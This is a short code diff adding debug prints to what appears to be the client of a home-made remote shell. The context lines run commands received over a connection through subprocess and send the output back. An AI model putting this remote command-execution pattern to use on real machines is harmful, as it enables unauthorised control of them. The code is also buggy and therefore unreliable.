@@ -25,6 +25,10 @@ def main():
         commmand = command.split(" ")
          # EXDCUTING COMMAND
         # getoutput returns output stdout and stderr of executing cmd in a shell
+        print("command is: ", end="")
+        print(command)
+        if command == "":
+            print("uh oh spaghetti o")
         output = subprocess.check_output(command, stderr=subprocess.STDOUT)
         client.send(output.encode())
         
